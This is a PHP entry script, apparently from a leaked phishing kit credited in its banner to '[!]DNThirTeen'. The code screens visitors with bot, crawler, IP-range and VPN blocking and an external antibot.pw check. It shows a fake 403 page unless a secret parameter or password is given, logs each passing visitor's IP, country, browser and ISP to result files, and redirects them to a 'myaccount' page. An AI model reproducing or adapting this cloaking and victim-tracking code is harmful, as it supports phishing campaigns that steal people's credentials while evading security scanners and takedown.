<?php
/*
▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
.▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀
FuCked By [!]DNThirTeen
https://www.facebook.com/groups/leakcode/
*/
error_reporting(0);
session_start();
require 'main.php';
require_once 'blocker.php';
if($setting['block_referrer'] == "on") {
	require_once 'crawlerdetect.php';
}
if(filesize("antibot.ini") == 1) {
}else{
    $ch = curl_init("https://antibot.pw");
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 1);
    $output = curl_exec($ch);
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    if($httpcode == "0") {
    }else{
        require_once("antibot.php");
    }
}
if($setting['block_iprange'] == "on") {
    require_once 'blacklist.php';
}
if($setting['onetime'] == "on") {
	require_once 'onetime.php';
}
if($setting['block_vpn'] == "on") {
    require_once 'proxyblock.php';
}
if($setting['site_param_on'] == "on") {
    $secret = $setting['site_parameter'];
    $password = $_GET[$secret];
    if(!isset($password)) {
        tulis_file("result/total_bot.txt","$ip|Wrong Site Parameter");
        header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
    }else{
        $_SESSION['key'] = $key;
    }
}
if($setting['site_pass_on'] == "on") {
    $secret = md5($ip);
    $password = $_POST[$secret];
    $mypass = md5($setting['site_password']);
    if(!isset($password)) {
        tulis_file("result/total_bot.txt","$ip|Wrong Site Password");
        header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
    }else{
        $_SESSION['site_password'] = $setting['site_password'];
    }
}
tulis_file("result/total_click.txt","$ip|$countrycode|$countryname|$br|$os|$ispuser");
$_SESSION['key'] = $key;
//header("location: myaccount?key=$key");
$randomid = md5(time());
echo "<!-- $randomid --><script type='text/javascript'>window.top.location='myaccount?key=".$key."';</script>";
?>

